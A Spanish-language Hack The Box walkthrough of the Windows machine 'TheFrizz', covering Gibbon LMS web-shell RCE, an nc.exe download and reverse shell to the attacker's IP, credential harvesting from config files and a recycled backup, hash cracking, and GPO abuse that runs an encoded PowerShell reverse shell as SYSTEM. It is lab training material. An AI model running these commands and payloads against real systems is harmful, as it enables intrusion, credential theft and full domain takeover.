---
tags:
title: TheFrizz- Medium (HTB)
toc: true
permalink: /TheFrizz-HTB-Writeup
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,51047,51051,51066 10.129.232.168
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 22:22 -03
Nmap scan report for 10.129.232.168
Host is up (0.73s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-03 08:23:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51047/tcp open  msrpc         Microsoft Windows RPC
51051/tcp open  msrpc         Microsoft Windows RPC
51066/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m53s
| smb2-time: 
|   date: 2025-12-03T08:24:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.07 seconds
```

## Website / Port 80 

En la pagina principal veo una simple interfaz.

![image-center](/assets/images/{8F1F6023-0914-480B-A91D-2E2CB1FE6A25}.png)

### Base64 

Si bajo un poco mas veo algunas descripciones pero una de ellas destaca.

![image-center](/assets/images/{323251E4-7C45-4F9E-93D2-B72CBC0A6BE4}.png)

Al parecer es un mensaje en `base64` y con algunos saltos de linea. Si decodifico el mismo en mi consola veo lo siguiente.

```bash
echo V2FudCB0byBsZWFybiBoYWNraW5nIGJ1dCBkb24ndCB3YW50IHRvIGdvIHRvIGphaWw/IFlvdSdsbCBsZWFybiB0aGUgaW4ncyBhbmQgb3V0cyBvZiBTeXNjYWxscyBhbmQgWFNTIGZyb20gdGhlIHNhZmV0eSBvZiBpbnRlcm5hdGlvbmFsIHdhdGVycyBhbmQgaXJvbiBjbGFkIGNvbnRyYWN0cyBmcm9tIHlvdXIgY3VzdG9tZXJzLCByZXZpZXdlZCBieSBXYWxrZXJ2aWxsZSdzIGZpbmVzdCBhdHRvcm5leXMu | base64 -d 
Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.
```

Nada interesante, solo habla de XSS.
## Login page

Si en el top de la pagina clickeo en `Staff Login` veo que me redirigue a una pagina donde corre el servicio de `Gibbon LMS`.

> `Gibbon LMS` es una plataforma gratuita y de código abierto para la gestión de escuelas, diseñada para ayudar a profesores, estudiantes y padres a organizar, comunicarse y seguir el progreso académico.

![image-center](/assets/images/{5C7B9C98-149D-4677-8161-0FC73F892ED2}.png)

## Shell as w.webservice

Como en la parte inferior veo una versión podría investigar por la misma, y es así donde llego a este [enlace](https://www.cvedetails.com/cve/CVE-2023-34598/) donde puedo ver que se trata de un `LFI` 
y además también la versión es vulnerable a una subida de archivo con una derivación en un `RCE (Remote Code Execution)` en este [PoC](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

Usando este ultimo `poc` lo hago de la siguiente forma, el cual ya el mismo automatiza el proceso de subir un archivo a la ruta `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`.

```bash
python3 gibbonlms_cmd_shell.py http://frizzdc.frizz.htb
[+] Successfully uploaded web shell to http://frizzdc.frizz.htb/Gibbons-LMS/crqq.php
[*] Here's your shell:
crqq.php?cmd=> whoami
frizz\w.webservice
frizz\w.webservice
```

Es asi como ya puedo tratar de subir en `nc.exe` y asi enviarme una shell a mi maquina.

```bash
crqq.php?cmd=> certutil -urlcache -split -f http://10.10.17.19/nc.exe C:\programdata\nc.exe
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.
CertUtil: -URLCache command completed successfully.
```

Y ahora para enviarme la shell uso el siguiente comando.

```bash
crqq.php?cmd=> C:\programdata\nc.exe 10.10.17.19 4444 -e cmd.exe
```

Y desde mi listener `nc` recibo la shell como `w.webservice`.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.168] 58831
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\Gibbon-LMS>whoami
whoami
frizz\w.webservice
```

### Mysql

```powershell
PS C:\xampp\htdocs\Gibbon-LMS> cat config.php
cat config.php
<SNIP>
n supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';
<SNIP>
```

Como tengo las credenciales de una base de datos, puedo usar `mysql.exe` que esta en el directorio `C:\xampp:\mysql\bin` para poder ejecutar comandos en la misma.

```powershell
PS C:\xampp\mysql\bin> ls
ls


    Directory: C:\xampp\mysql\bin


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
<SNIP>>                                                  
-a----        10/30/2023   5:49 AM          25746 myrocks_hotbackup                                                    
-a----        10/30/2023   5:58 AM        3784616 mysql.exe                                                            
```

Para ver las bases de datos use el siguiente comando.

```powershell
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"
Database
gibbon
information_schema
test
```

Veo 4 pero me interesa por ahora la base `Gibbon`. Ahora indicandole esa base puedo listar las tablas.

```sql
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SHOW TABLES;" 
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SHOW TABLES;" 
Tables_in_gibbon
<SNIP>
gibbonperson
gibbonpersonaldocument
<SNIP>
```

Hay demasiadas tablas pero solo una de ellas me llama la atencion que es `Gibbonperson` el cual puede contener datos de los usuarios de la pagina.

```powershell
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SELECT * FROM gibbonperson;"
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SELECT * FROM gibbonperson;"
<SNIP>
0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489     N       Full    Y       001     <SNIP>
```
### Crack password

Es así como veo el usuario `f.frizzle` con la password, la cual parece ser un hash en formato `SHA-256`, el mismo lo meto en un archivo para poder romperlo y asi obtener su `password` en texto plano.

```bash
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

Quedaría así y lo crackeo con el modo `1420` de `hashcat`.

```bash
 hashcat -m 1420 -a 0 hash /usr/share/wordlists/rockyou.txt
<SNIP>
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
<SNIP>
```

### Validate credentials

Ahora que tengo las credenciales para el usuario `f.frizzle` puedo verificar que sean validas.

```bash
nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'
SMB         10.129.232.168  445    10.129.232.168   [*]  x64 (name:10.129.232.168) (domain:10.129.232.168) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.232.168  445    10.129.232.168   [-] 10.129.232.168\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED 
```

## Kerberos auth

Este error se debe a que probablemente use autenticación por `Kerberos`, por lo que tengo que usar el parámetro `-k` y además me tengo que crear un archivo de configuración de `Kerberos` y sincronizar mi reloj con la hora del `DC` con `ntpdate`.

```bash
ntpdate -b 10.129.232.168                                                                         
2025-12-03 06:30:51.215462 (-0300) +25254.370597 +/- 0.189166 10.129.232.168 s1 no-leap
CLOCK: time stepped by 25254.370597
```

Ahora puedo intentar generar el `krb5.conf`.

```bash
nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf 
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:                                                     
```

```bash 
cat krb5.conf                       

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
        default_domain = frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
```

Exporto el archivo de configuración a la variable de `Kerberos`.

```
export KRB5_CONFIG=./krb5.conf 
```

## Shell as f.frizzle

### Kerberos ticket

Como al enumerar `shares` veo los típicos, volví al escaneo de `nmap` y es donde vi el puerto `22` de `ssh` abierto por lo que podría intentar conectarme a este servicio de la maquina con las credenciales que tengo ahora.

```bash
ssh f.frizzle@frizz.htb                                            
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
f.frizzle@frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
```

Este error se debe a que la autenticación  `kerberos` fallo, ya que también el servidor no acepta autenticación por contraseña por lo que para solicitar un ticket valido, no puedo hacerlo como lo hago habitualmente con `getTGT` de `impacket`, sino que en este caso tengo que usar `kinit`.

```bash
kinit f.frizzle                                                                        
Password for f.frizzle@FRIZZ.HTB: 
```

```bash
klist          
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
12/03/2025 06:41:21  12/03/2025 16:41:21  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 12/04/2025 06:41:13
```
### SSH

Y ahora puedo entrar en `ssh` como el usuario.

```bash
ssh -k f.frizzle@frizz.htb       

PowerShell 7.4.5
PS C:\Users\f.frizzle> whoami
frizz\f.frizzle
```

```powershell
PS C:\Users\f.frizzle\Desktop> ls

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--           12/3/2025 12:20 AM             34 user.txt

PS C:\Users\f.frizzle\Desktop> cat .\user.txt         
9bb54076e7efd27218b2e56ade091a76
```

## Shell as m.schoolbus

En la maquina no hay demasiadas cosas, pero entre las que encontre es la lista de usuarios, de los cuales ya obtuve a dos `(w.Webservice y a f.frizzle)`.

```powershell
PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           3/11/2025  3:37 PM                Administrator
d----          10/29/2024  7:27 AM                f.frizzle
d----          10/29/2024  7:31 AM                M.SchoolBus
d-r--          10/29/2024  7:13 AM                Public
d----           2/19/2025  1:35 PM                v.frizzle
d----           2/19/2025  1:35 PM                w.Webservice
```

En el directorio de la raiz veo un archivo el cual no es usual para nada.

```powershell
PS C:\> ls -force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:41 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:41 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           12/3/2025 12:56 AM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp
```

Pero no puedo verlo.

```powershell
PS C:\> cat DumpStack.log.tmp
Get-Content: Access to the path 'C:\DumpStack.log.tmp' is denied.
```

### $RECYCLE.BIN directory

Sin embargo en el directorio `$RECYCLE.BIN` hay una carpeta con el `sid` del usuario actual `(f.frizzle)`.

```powershell
PS C:\$RECYCLE.BIN> ls -force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

PS C:\$RECYCLE.BIN> cd .\S-1-5-21-2386970044-1145388522-2932701813-1103\
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103
```
### Metadata file

Dentro del mismo hay dos archivos `7z`.

```powershell
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```

Con la ayuda de la `IA` descubrí que los archivos según la nomenclatura significan o tienen un contenido distinto.
## Explicación de los archivos:

- **`$RECYCLE.BIN`**: Papelera de reciclaje de Windows
- **`S-1-5-21-2386970044-1145388522-2932701813-1103`**: SID del usuario (en este caso, probablemente `f.frizzle`)
- **`$I` prefix**: Archivo de **metadatos** (información sobre el archivo eliminado: nombre original, fecha, ubicación)
- **`$R` prefix**: Archivo **real** (el contenido del archivo eliminado)

En tu mi:

- **`$IE2XMEG.7z`** (148 bytes): Metadatos del archivo `.7z` eliminado
- **`$RE2XMEG.7z`** (30 MB): El archivo `.7z` real eliminado

Y para analizar los metadatos del archivo `7z` real uso el siguiente comando.

```powershell
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $bytes = [System.IO.File]::ReadAllBytes("C:\`$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\`$IE2XMEG.7z")
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> [System.Text.Encoding]::Unicode.GetString($bytes)
☻⁛ǐᘀ㊗⨏Ǜ<C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z
```

Es así que descubro el que nombre del archivo original es `wapt-backup-sunday.7z`. Por lo que desde mi maquina me puedo descargar el archivo con `scp` renombrándolo con ese nombre.

```bash
scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
<SNIP>
$RE2XMEG.7z                                                                                                                                              100%   29MB   1.2MB/s   00:23
```

Puedo usar la misma herramienta `7z` para ver el contenido del comprimido
```bash                                           
7z l wapt-backup-sunday.7z
<SNIP>
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-10-23 01:18:40 D....            0            0  wapt
2024-10-23 01:12:25 D....            0            0  wapt/cache
2024-10-23 01:12:25 D....            0            0  wapt/cache/icons
2024-10-23 01:12:25 D....            0            0  wapt/conf
2024-10-23 00:35:50 D....            0            0  wapt/conf.d
2024-10-23 01:16:45 D....            0            0  wapt/db
2024-10-23 01:12:26 D....            0            0  wapt/DLLs
2024-10-23 01:12:26 D....            0            0  wapt/keys
<SNIP>
```

## Creds for m.school.bus

Son demasiado archivos los que contiene este comprimido, así que lo descomprimo y analiza cada uno de los archivos que contiene el mismo

```bash
7z x wapt-backup-sunday.7z 
```

Contenido:

```bash
ls
auth_module_ad.py  DLLs          private                setuphelpers.py          version-full              wapt-get.ini       wapt.psproj           wapt-signpackages.py  wgetwads64.exe
cache              keyfinder.py  __pycache__            setuphelpers_unix.py     waptbinaries.sha256       wapt-get.ini.tmpl  waptpython.exe        wapttftpserver
common.py          keys          revision.txt           setuphelpers_windows.py  waptconsole.exe.manifest  wapt-get.py        waptpythonw.exe       wapttftpserver.exe
conf               languages     Scripts                ssl                      waptcrypto.py             waptguihelper.pyd  wapt-scanpackages.py  wapttray.exe
conf.d             lib           setupdevhelpers.py     templates                wapt-enterprise.ico       waptlicences.pyd   waptself.exe          waptutils.py
COPYING.txt        licencing.py  setuphelpers_linux.py  trusted_external_certs   wapt-get.exe              waptmessage.exe    waptserver.exe        waptwua
db                 log           setuphelpers_macos.py  unins000.msg             wapt-get.exe.manifest     waptpackage.py     waptservice.exe       wgetwads32.exe
```

Dentro del archivo la carpeta `conf/` hice un `cat` asi:

```bash
cat conf/*
```

Es así que se aplica sobre cada uno de los archivos que contiene la misma y vi lo siguiente.

```bash
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log

[options]
db_name=wapt
#db_host=
db_user=wapt
#db_password=

wapt_user=admin
<SNIP>
```
### Validate creds

Lo que parece en el campo `wapt_password` es una password codificada en `base64` por lo que ejecuto el siguiente comando para decodificarla y así es como pude ver la `password` en texto claro

```bash
echo IXN1QmNpZ0BNZWhUZWQhUgo= | base64 -d                     
!suBcig@MehTed!R
```

Probando con el usuario `M.SchoolBus`.

```bash
ssh M.SchoolBus@frizz.htb       
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
M.SchoolBus@frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
```

Misma historia, tengo que solicitar el ticket para este usuario con `kinit`.

```bash
kinit M.SchoolBus
Password for M.SchoolBus@FRIZZ.HTB: 
                                                                                                                                    klist            
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: M.SchoolBus@FRIZZ.HTB

Valid starting       Expires              Service principal
12/03/2025 07:08:05  12/03/2025 17:08:05  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 12/04/2025 07:07:56
```

Y ahora si puedo loguearme nuevamente por `ssh`

```powershell
ssh -k M.SchoolBus@frizz.htb 
<SNIP>>
PowerShell 7.4.5
PS C:\Users\M.SchoolBus> 
```

## Shell as nt authority\system

### Enumeration

Como puedo ver, el usuario que poseo es parte del grupo `Desktop admins`.

```powershell
PS C:\Users\M.SchoolBus> net user M.SchoolBus
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 6:27:03 AM
Password expires             Never
Password changeable          10/29/2024 6:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/3/2025 2:08:05 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Desktop Admins       
The command completed successfully.
```

Lo mismo se puede enumerar con `bloodhound` pero primero para poder obtener los `json` con los datos use `bloodhound-python`. Usando el siguiente comando.

```bash
bloodhound-python -c All -u 'M.SchoolBus' -p '!suBcig@MehTed!R' -k -ns 10.129.232.168 -d frizz.htb
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: frizz.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Testing resolved hostname connectivity dead:beef::247d:e2b4:e9a:44db
INFO: Trying LDAP connection to dead:beef::247d:e2b4:e9a:44db
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Testing resolved hostname connectivity dead:beef::247d:e2b4:e9a:44db
INFO: Trying LDAP connection to dead:beef::247d:e2b4:e9a:44db
INFO: Found 22 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: frizzdc.frizz.htb
INFO: Done in 01M 51S
```
### Interesting group

![image-center](/assets/images/{1F19E75C-E70C-46AB-A22C-647B47E8AC95}.png)
### GPO Abuse

Con los datos cargador pude ver el el grupo `Desktop Admins` es también parte del grupo [Group Policy Creator Owners](https://www.thehacker.recipes/ad/movement/group-policies).

>"`Group Policy`" es una característica de administración de `Active Directory`. Permite a los administradores gestionar ordenadores y usuarios. Los Objetos de Políticas de Grupo (`GPOs`) conforman las Políticas de Grupo. Los GPO están asociados a objetos AD (sitios, dominios, unidades organizativas (`OU`)).

Esto lo puedo ver desde la `shell` de `Powershell` con este comando:

```powershell
PS C:\ProgramData> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192
```
### Adding a new GPO

Para poder escalar a `system` necesito agregar una nueva `GPO` con el siguiente comando.

```powershell
PS C:\ProgramData> New-GPO -Name "zs1n"                                                 

DisplayName      : zs1n
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 1a2c4bc4-98d9-4fa3-8c97-b72cbdb43459
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 12/3/2025 2:43:13 AM                                                                                                                                                    
ModificationTime : 12/3/2025 2:43:13 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
```

Es ahora como puedo hacer uso de [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) para poder ejecutar comandos bajos esta `GPO`.

```powershell
PS C:\ProgramData> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "zs1n_privesc" --Author 'zs1n' --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --GPOName "zs1n"                                                                                                                                                                                
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "zs1n" is: {1A2C4BC4-98D9-4FA3-8C97-B72CBDB43459}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{1A2C4BC4-98D9-4FA3-8C97-B72CBDB43459}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

Con el siguiente comando lo que hice fue.
`--AddComputerTask`

- **Crea una tarea programada (Scheduled Task)** que se ejecutará en las computadoras donde se aplique la GPO
- La tarea se ejecuta con privilegios de **SYSTEM** (máximo privilegio en Windows)
- Se ejecuta **inmediatamente** cuando la GPO se refresca

 `--TaskName "zs1n_privesc"`

- **Nombre de la tarea programada**: "zs1n_privesc"
- Es el nombre que aparecerá en el Programador de Tareas de Windows

 `--Author 'zs1n'`

- **Autor de la tarea**: aparece como creada por "zs1n"
- Es metadata, no afecta la ejecución

`--Command "powershell.exe"`

- **Comando a ejecutar**: PowerShell
- Este es el programa que se ejecutará cuando la tarea se active
 `--Arguments "powershell -e JABjAGwAaQ..."`

Esta es la parte más importante, ya que es aca donde ejecuto el código `PowerShell` en `base64` el cual me envía un shell a mi maquina

Ya después el siguiente paso es `Linkear` la `GPO` al `DC`.
### Linking GPO

```powershell
PS C:\ProgramData> New-GPLink -Name "zs1n" -Target "DC=frizz,DC=htb" -LinkEnabled Yes

GpoId       : 3aaefafa-4134-41e5-8a5c-e08500e356f4
DisplayName : zs1n
Enabled     : True
Enforced    : False
Target      : DC=frizz,DC=htb
Order       : 2
```
### Update GPOs

Y ahora forzamos la actualización de las `GPOs`.

```powershell
PS C:\ProgramData> gpupdate /force
Updating policy...
```
### Shell

Y es así como desde mi listener `nc` recibo la conexión junto con la shell como `nt authority\system`.

```powershell
rlwrap -cAr nc -nlvp 4444                                               
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.253.250] 53073
whoami
nt authority\system
```

```powershell
PS C:\users\administrator\desktop> type root.txt
a18400b3cf3c49576b88b65685fd1f87
```

`~Happy Hacking.`